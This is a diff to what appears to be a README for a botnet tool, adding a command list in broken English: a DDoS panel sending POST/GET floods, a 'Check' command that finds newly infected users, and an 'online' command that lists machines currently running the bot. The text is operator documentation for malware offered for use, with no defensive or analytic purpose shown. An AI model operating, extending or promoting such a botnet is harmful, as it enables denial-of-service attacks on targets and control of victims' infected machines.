@@ -56,6 +56,12 @@ When you write your username + password community write you that you logined in 
 # Commands
 
 Here's be all comands that your BotNET can do
+```
+DDoS - enter in POST/GET requests panel
+Check - where you type "Check" to your BotNET him check for new users that now have runned BotNET.
+online - when you type "online" - all users who have runned BotNET right now is shown you
+```
+below be more advanced description
 
 # DDoS
 
